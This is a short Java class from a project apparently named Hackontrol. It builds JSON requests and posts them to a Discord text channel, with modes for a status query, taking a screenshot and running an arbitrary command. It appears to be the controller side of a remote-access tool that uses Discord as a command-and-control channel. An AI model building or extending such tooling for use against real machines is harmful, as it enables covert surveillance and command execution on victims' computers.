package com.khopan.hackontrol.network;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;

import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

public class Request {
	private final TextChannel channel;
	private final ObjectMapper mapper;

	public Request(TextChannel channel) {
		this.channel = channel;
		this.mapper = new ObjectMapper();
	}

	public void statusQuery() {
		this.request(RequestMode.STATUS_QUERY, this.mapper.createObjectNode());
	}

	public void screenshot() {
		this.request(RequestMode.TAKE_SCREENSHOT, this.mapper.createObjectNode());
	}

	public void command(String command) {
		ObjectNode node = this.mapper.createObjectNode();
		node.put("command", command);
		this.request(RequestMode.EXECUTE_COMMAND, node);
	}

	private void request(int requestMode, ObjectNode node) {
		node.put("requestMode", requestMode);
		String message = node.toString();
		this.channel.sendMessage(message).queue();
	}
}
